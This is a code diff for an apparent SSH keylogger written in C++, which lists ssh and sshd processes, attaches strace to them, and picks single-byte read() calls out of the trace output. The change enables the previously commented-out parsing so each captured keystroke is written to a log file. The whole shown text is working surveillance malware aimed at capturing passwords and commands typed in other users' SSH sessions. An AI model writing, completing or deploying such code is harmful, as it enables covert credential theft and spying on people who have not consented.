@@ -55,10 +55,12 @@ std::tuple<std::string, uint16_t, std::string, std::string> split_proc_info(std:
     return splitted_proc_info;
 }
 
-//std::string parse_strace_output(std::string& output){
-//    auto last_qoma = output.find("\", 16384) ");
-//
-//}
+std::string parse_strace_output(std::string& output){
+    auto pos = output.find("\", 16384)");
+    auto subs = output.substr(pos-1, 1);
+    std::cout << "POSITION: " << pos << " " << subs << std::endl;
+    return subs;
+}
 
 std::vector<Process> get_proc_list_of_ssh(){
     std::string command("ps -auxw");
@@ -104,16 +106,17 @@ void ssh_keylogger(const uint16_t& pid){
         std::cout << "Log-file error: " << log_filename << std::endl;
         return;
     }
-    std::array<char, 256> buffer{};
-    while(fgets(buffer.data(), 256, pipe) != nullptr){
+    std::array<char, 128> buffer{};
+    while(fgets(buffer.data(), 128, pipe) != nullptr){
         // tmplt to find: read(11, "s", 16384)
         std::string data_from_strace{buffer.data()};
         if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 16384") != std::string::npos &&
                                                                     data_from_strace.find("= 1") != std::string::npos){
-//            std::string symbol = parse_strace_output(data_from_strace);
-//            std::fwrite(symbol.data(), 1, 1, fd);
+            std::string symbol = parse_strace_output(data_from_strace);
+            std::cout << "SYMBOL: " << symbol << std::endl;
+            std::fwrite(symbol.data(), 1, symbol.size(), fd);
         } else {
-            std::fwrite("error", 1, 6, fd);
+            continue;
         }
     }
     auto returnCode = pclose(pipe);
@@ -139,14 +142,14 @@ void sshd_keylogger(const uint16_t& pid){
     }
     std::array<char, 256> buffer{};
     while(fgets(buffer.data(), 256, pipe) != nullptr){
-        // tmplt to find: read(11, "s", 16384)
         std::string data_from_strace{buffer.data()};
         if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 16384") != std::string::npos &&
                                                                     data_from_strace.find("= 1") != std::string::npos){
-//            std::string symbol = parse_strace_output(data_from_strace);
-//            std::fwrite(symbol.data(), 1, 1, fd);
+            std::string symbol = parse_strace_output(data_from_strace);
+            std::cout << "SYMBOL: " << symbol << std::endl;
+            std::fwrite(symbol.data(), 1, symbol.size(), fd);
         } else {
-            std::fwrite("error", 1, 6, fd);
+            continue;
         }
     }
     auto returnCode = pclose(pipe);
